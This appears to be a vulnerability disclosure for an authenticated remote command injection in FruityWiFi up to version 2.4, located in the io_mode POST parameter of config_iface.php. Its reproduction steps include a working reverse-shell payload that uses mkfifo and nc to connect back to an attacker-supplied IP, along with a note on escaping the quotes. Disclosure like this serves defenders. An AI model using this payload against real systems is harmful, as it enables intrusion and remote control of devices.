# Issue Description

During the analysis of the software, it was observed that the fruitywifi <=v2.4 allows a malicious actor to perform a Remote Command Execution. The issues were found on the `/scripts/config_iface.php` due to improper handling of shell metacharacters which are a part of the "POST" Request. An authentication bad actor can exploit these issues by creating a malicious payload that will contain shell metacharacters in the `io_mode` of the "POST Request". This issue happens due to missing input validation in the requests which allows execution of the commands.

# Steps To Reproduce

1.Log into the application with credentials.

2. Navigate to the following URL: https://<fruity\_ip>:port/scripts/config\_iface.php.

3. Intercept the request with proxy tools such as Burp Suite and then change request method to POST.

4. Now, add "io\_mode"`" parameter in POST body and insert payload the following payload:

> io\_mode="'";rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+<IP\_HERE>+1337+>/tmp/f;#

5. Start a NC Listener on port 1337.
6. Upon processing the request, you will be able to get the shell.

   **Note**: In order to bypass, we need to satisfy the quotes then insert our payload.
